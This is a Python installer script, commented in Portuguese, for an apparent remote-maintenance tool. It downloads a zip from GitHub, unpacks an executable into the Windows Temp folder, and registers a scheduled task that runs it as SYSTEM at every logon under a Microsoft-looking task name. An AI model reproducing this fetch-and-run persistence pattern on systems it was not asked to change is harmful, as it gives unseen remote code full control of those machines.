# Importações de bibliotecas padrão
import os
import zipfile
import logging
import time
# Importações de bibliotecas de terceiros
import requests
import shutil
import subprocess

# Variáveis globais
url_maintenance = 'https://github.com/smedsarandi/remote_maintenance/raw/main/dist/maintenance.zip'
arquivo_exe = 'maintenance.exe'
arquivo_zip_destino = 'c:/Windows/Temp/maintenance.zip'
arquivo_exe_destino = 'c:/Windows/Temp/maintenance.exe'

logging.basicConfig(level=logging.INFO, filename="install.log", format="%(asctime)s - %(levelname)s - %(message)s")

def download_maintenance_exe(url):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(arquivo_zip_destino, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        logging.info('Arquivo baixado')
        
        with zipfile.ZipFile(arquivo_zip_destino, 'r') as zip_ref:
            logging.info('Extraindo arquivo zip')
            zip_ref.extractall('c:/Windows/Temp')
        
        time.sleep(5)
        os.remove(arquivo_zip_destino)
    else:
        logging.error(f"Erro ao baixar o arquivo: Status code {response.status_code}")

download_maintenance_exe(url=url_maintenance)

try:
    subprocess.Popen('schtasks /create /sc ONLOGON /ru System /tr c:\\Windows\\Temp\\maintenance.exe /tn Microsoft\\Windows\\Maintenance\\maintenance', shell=True)
    logging.info('Tarefa maintenance criada')
except Exception as e:
    logging.error(f'Tarefa maintenance NÃO foi criada: {e}')

time.sleep(2)
